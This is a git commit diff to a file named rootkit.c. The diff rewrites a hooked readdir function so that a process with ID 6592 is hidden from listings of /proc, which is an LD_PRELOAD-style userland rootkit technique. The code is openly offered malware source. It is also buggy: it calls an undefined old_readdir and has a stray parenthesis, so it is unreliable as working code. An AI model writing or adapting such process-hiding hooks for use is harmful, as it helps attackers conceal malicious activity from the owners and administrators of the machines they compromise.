37733c7b2b11ba14d607d50d5196d8fce43c1a8e
master-saz <145714482+master-saz@users.noreply.github.com>
2023-09-25 21:42:35 +0200

    Update rootkit.c

--- rootkit.c
+++ rootkit.c
@@ -8,6 +8,7 @@
 #include <dlfcn.h>
 
 static struct dirent *(*orig_readdir) (DIR *) = NULL;
+static const char* hide_process = "6592";
 
 struct dirent *readdir (DIR * dirp){
    if (orig_readdir == NULL){
@@ -17,36 +18,11 @@ struct dirent *readdir (DIR * dirp){
       fprintf(stderr, "Catched\n");
    }
 
-   DIR *directory;
-   DIR *subdirectory;
-   static const char* hide_process = "6592";
-   // will store pointer to each entry in the directory
-   struct dirent *entry;
+   struct dirent* ret = old_readdir(dirp);
+   
+   while (ret != NULL && (strcmp(ret->d_name,hide_process) == 0))){
+      ret = orig_readdir (dirp);
+   }
+   return ret;
      
-   // attempt to open the current working directory, opendir() returns NULL 
-   // on failure
-   directory = opendir("/proc");
-    // Read each entry in the directory with readdir() and store the pointer to 
-    // the struct dirent into entry... when there are no more entries in the 
-    // directory readdir() will return NULL and terminate the loop at that point.
-    while ((entry = readdir(directory)) != NULL){
-       // if the entry is a directory, output the directory name 
-       // prepended with "dir: " again so we know what what it is when looking 
-       // at the program output.
-       if (entry->d_type == DT_DIR) {
-         if ( strcmp(entry->d_name, hide_process) == 0){
-              printf("Found PID: %s ", entry->d_name);
-          }
-          else {
-             return (orig_readdir (dirp));
-          }
-     }
-     
-     // close the directory... if closedir() fails it will return -1
-     if (closedir(directory) == -1)
-     {
-       // exit with an error message and status if closedir() fails
-       printf("Error closing directory.\n");
-     }
-     }
 }
